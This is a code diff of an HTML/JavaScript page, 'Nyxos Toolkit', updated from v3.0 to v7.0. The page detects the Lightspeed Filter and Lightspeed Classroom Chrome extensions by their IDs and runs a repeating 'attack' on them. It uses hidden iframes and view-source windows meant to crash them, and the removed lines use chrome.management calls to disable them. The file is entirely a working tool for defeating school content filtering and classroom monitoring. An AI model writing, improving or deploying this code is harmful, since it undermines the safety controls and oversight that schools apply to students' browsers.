@@ -3,139 +3,336 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nyxos Toolkit v3.0</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <title>Nyxos Toolkit v7.0</title>
     <style>
         :root {
             --bg: #0d1117;
             --panel: #161b22;
             --accent: #58a6ff;
             --danger: #f85149;
+            --success: #3fb950;
             --text: #c9d1d9;
+            --warning: #d29922;
         }
         body {
+            font-family: 'Courier New', monospace;
             background: var(--bg);
             color: var(--text);
-            font-family: 'JetBrains Mono', monospace;
+            margin: 0;
             padding: 20px;
-            max-width: 800px;
-            margin: 0 auto;
+            line-height: 1.6;
         }
         .header {
-            font-size: 24px;
-            margin-bottom: 20px;
             color: var(--accent);
             border-bottom: 1px solid #30363d;
             padding-bottom: 10px;
+            margin-bottom: 20px;
         }
         .panel {
             background: var(--panel);
             border-radius: 6px;
-            padding: 20px;
-            margin-bottom: 20px;
+            padding: 15px;
+            margin-bottom: 15px;
             border: 1px solid #30363d;
         }
-        .btn {
-            padding: 10px 15px;
-            border-radius: 6px;
-            border: none;
-            font-family: inherit;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-right: 10px;
-            margin-bottom: 10px;
-        }
-        .btn-primary {
-            background: var(--accent);
-            color: white;
-        }
-        .btn-danger {
+        button {
             background: var(--danger);
             color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+            margin-right: 10px;
+            transition: all 0.2s;
+        }
+        button:disabled {
+            background: #484f58;
+            cursor: not-allowed;
+        }
+        button:hover:not(:disabled) {
+            opacity: 0.9;
         }
         .status {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--panel);
-            padding: 10px 15px;
-            border-radius: 6px;
-            border: 1px solid #30363d;
+            bottom: 10px;
+            right: 10px;
+            background: var(--danger);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+        .target-list {
+            margin-top: 15px;
+        }
+        .target-item {
+            margin-bottom: 10px;
+            padding: 10px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .detection-status {
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .detected {
+            background: var(--success);
+        }
+        .missing {
+            background: var(--danger);
+        }
+        .checking {
+            background: var(--warning);
+        }
+        .attack-active {
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <h1 class="header">Nyxos Toolkit v3.0</h1>
-
-    <div class="panel">
-        <h2>Extension Control</h2>
-        <button class="btn btn-primary" id="disableExt">Disable Extensions</button>
-        <button class="btn btn-danger" id="crashExt">Crash Extensions</button>
+    <div class="header">
+        <h1>Nyxos Toolkit v7.0</h1>
+        <p>Dual Extension Detection & Disabler</p>
     </div>
 
     <div class="panel">
-        <h2>Chrome Pages</h2>
-        <button class="btn btn-primary" id="blockPages">Block Chrome Pages</button>
+        <h2>System Check</h2>
+        <div class="target-list" id="detectionResults">
+            <p>Detecting installed extensions...</p>
+        </div>
     </div>
 
-    <div class="status" id="status">Status: Ready</div>
+    <div class="panel" id="attackPanel" style="display: none;">
+        <h2>Attack Controls</h2>
+        <button id="startAttack">Start Continuous Attack</button>
+        <button id="stopAttack" disabled>Stop Attack</button>
+        <div class="target-list" id="attackStatus"></div>
+    </div>
+
+    <div class="panel">
+        <h2>Attack Log</h2>
+        <div id="attackLog" style="height: 100px; overflow-y: scroll; background: black; padding: 10px; font-family: monospace;"></div>
+    </div>
+
+    <div class="status" id="status">Status: Initializing...</div>
 
     <script>
         // Extension targets
-        const EXTENSIONS = {
-            filter: 'adkcpkpghahmbopkjchobieckeoaoeem',
-            classroom: 'kkbmdgjggcdajckdlbngdjonpchpaiea'
+        const TARGETS = {
+            lightspeedFilter: {
+                id: 'adkcpkpghahmbopkjchobieckeoaoeem',
+                name: 'Lightspeed Filter',
+                detected: false,
+                active: false
+            },
+            lightspeedClassroom: {
+                id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
+                name: 'Lightspeed Classroom',
+                detected: false,
+                active: false
+            }
         };
 
-        // Chrome pages to block
-        const CHROME_PAGES = [
-            'chrome://print',
-            'chrome://user-education-internals/',
-            'chrome://webui-gallery/a11y'
-        ];
+        let attackInterval = null;
+        let attackSpeed = 1000; // 1 second between attacks
+        let allExtensionsDetected = false;
 
-        function updateStatus(text) {
-            document.getElementById('status').textContent = `Status: ${text}`;
+        function logMessage(message) {
+            const log = document.getElementById('attackLog');
+            log.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
+            log.scrollTop = log.scrollHeight;
         }
 
-        // REAL extension disabling
-        document.getElementById('disableExt').addEventListener('click', async () => {
-            try {
-                await chrome.management.setEnabled(EXTENSIONS.filter, false);
-                await chrome.management.setEnabled(EXTENSIONS.classroom, false);
-                updateStatus('Extensions Disabled');
-            } catch (e) {
-                updateStatus('Error: Try in extension popup');
-                console.error(e);
-            }
-        });
+        function updateStatus(text, isError = false) {
+            const status = document.getElementById('status');
+            status.textContent = `Status: ${text}`;
+            status.style.background = isError ? 'var(--danger)' : 'var(--accent)';
+        }
 
-        // Extension crashing via resource overload
-        document.getElementById('crashExt').addEventListener('click', () => {
-            for (let i = 0; i < 50; i++) {
+        // Detect if extensions are installed
+        async function detectExtensions() {
+            let detectionCount = 0;
+            
+            for (const [key, target] of Object.entries(TARGETS)) {
+                updateDetectionStatus(target, 'checking');
+                
                 try {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = `chrome-extension://${EXTENSIONS.filter}/main.js`;
-                    document.body.appendChild(iframe);
-                    setTimeout(() => iframe.remove(), 100);
-                } catch (e) {}
+                    // Try to load extension resource
+                    const detected = await checkExtensionExists(target.id);
+                    TARGETS[key].detected = detected;
+                    updateDetectionStatus(target, detected ? 'detected' : 'missing');
+                    
+                    if (detected) detectionCount++;
+                } catch (e) {
+                    TARGETS[key].detected = false;
+                    updateDetectionStatus(target, 'missing');
+                }
             }
-            updateStatus('Extensions Crashed');
-        });
+            
+            allExtensionsDetected = detectionCount === Object.keys(TARGETS).length;
+            
+            if (allExtensionsDetected) {
+                document.getElementById('attackPanel').style.display = 'block';
+                updateStatus('Both target extensions detected');
+                logMessage('System ready - both targets detected');
+            } else {
+                updateStatus('Missing required extensions', true);
+                logMessage('Error: Required extensions not detected');
+            }
+        }
 
-        // ACTUAL chrome:// page blocking
-        document.getElementById('blockPages').addEventListener('click', () => {
-            CHROME_PAGES.forEach(page => {
-                try {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = page;
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    setTimeout(() => iframe.remove(), 1000);
-                } catch (e) {}
+        function updateDetectionStatus(target, status) {
+            const results = document.getElementById('detectionResults');
+            const existing = document.getElementById(`detect-${target.id}`);
+            
+            if (existing) {
+                existing.querySelector('.detection-status').className = `detection-status ${status}`;
+                existing.querySelector('.detection-status').textContent = 
+                    status === 'detected' ? 'DETECTED' : 
+                    status === 'missing' ? 'MISSING' : 'CHECKING';
+                return;
+            }
+            
+            const div = document.createElement('div');
+            div.className = 'target-item';
+            div.id = `detect-${target.id}`;
+            div.innerHTML = `
+                <span>${target.name} (${target.id})</span>
+                <span class="detection-status ${status}">
+                    ${status === 'detected' ? 'DETECTED' : 
+                      status === 'missing' ? 'MISSING' : 'CHECKING'}
+                </span>
+            `;
+            results.appendChild(div);
+        }
+
+        // Check if extension exists by trying to load its resource
+        function checkExtensionExists(extId) {
+            return new Promise((resolve) => {
+                const iframe = document.createElement('iframe');
+                iframe.src = `chrome-extension://${extId}/manifest.json`;
+                iframe.style.display = 'none';
+                
+                iframe.onload = () => {
+                    iframe.remove();
+                    resolve(true);
+                };
+                
+                iframe.onerror = () => {
+                    iframe.remove();
+                    resolve(false);
+                };
+                
+                // Timeout fallback
+                setTimeout(() => {
+                    iframe.remove();
+                    resolve(false);
+                }, 2000);
+                
+                document.body.appendChild(iframe);
             });
-            updateStatus('Chrome Pages Blocked');
+        }
+
+        // Attack functions
+        async function disableExtension(target) {
+            return new Promise((resolve) => {
+                try {
+                    // Method 1: Try to open extension page in iframe
+                    const iframe = document.createElement('iframe');
+                    iframe.src = `chrome-extension://${target.id}/main.js`;
+                    iframe.style.display = 'none';
+                    
+                    iframe.onload = iframe.onerror = () => {
+                        setTimeout(() => {
+                            iframe.remove();
+                            // Method 2: Open view-source to crash extension
+                            try {
+                                const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, '_blank');
+                                setTimeout(() => win && win.close(), 100);
+                            } catch (e) {}
+                            resolve(true);
+                        }, 100);
+                    };
+                    
+                    document.body.appendChild(iframe);
+                } catch (e) {
+                    resolve(false);
+                }
+            });
+        }
+
+        async function attackExtensions() {
+            if (!allExtensionsDetected) return;
+            
+            for (const [key, target] of Object.entries(TARGETS)) {
+                if (!target.detected) continue;
+                
+                const success = await disableExtension(target);
+                TARGETS[key].active = success;
+                updateAttackStatus();
+                logMessage(`${target.name}: ${success ? 'ATTACKED' : 'FAILED'}`);
+            }
+            updateStatus(`Attacking - ${new Date().toLocaleTimeString()}`);
+        }
+
+        function updateAttackStatus() {
+            const status = document.getElementById('attackStatus');
+            status.innerHTML = Object.values(TARGETS)
+                .filter(target => target.detected)
+                .map(target => `
+                    <div class="target-item">
+                        <span>${target.name}</span>
+                        <span class="detection-status ${target.active ? 'attack-active' : ''}">
+                            ${target.active ? 'UNDER ATTACK' : 'INACTIVE'}
+                        </span>
+                    </div>
+                `).join('');
+        }
+
+        // Event listeners
+        document.getElementById('startAttack').addEventListener('click', () => {
+            if (attackInterval || !allExtensionsDetected) return;
+            
+            logMessage('Starting continuous attack...');
+            document.getElementById('startAttack').disabled = true;
+            document.getElementById('stopAttack').disabled = false;
+            
+            attackExtensions(); // Immediate attack
+            attackInterval = setInterval(attackExtensions, attackSpeed);
+        });
+
+        document.getElementById('stopAttack').addEventListener('click', () => {
+            if (attackInterval) {
+                clearInterval(attackInterval);
+                attackInterval = null;
+                document.getElementById('startAttack').disabled = false;
+                document.getElementById('stopAttack').disabled = true;
+                
+                // Reset attack states
+                Object.values(TARGETS).forEach(target => {
+                    target.active = false;
+                });
+                updateAttackStatus();
+                
+                logMessage('Attack stopped');
+                updateStatus('Ready');
+            }
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            logMessage('System initializing...');
+            detectExtensions();
         });
     </script>
 </body>
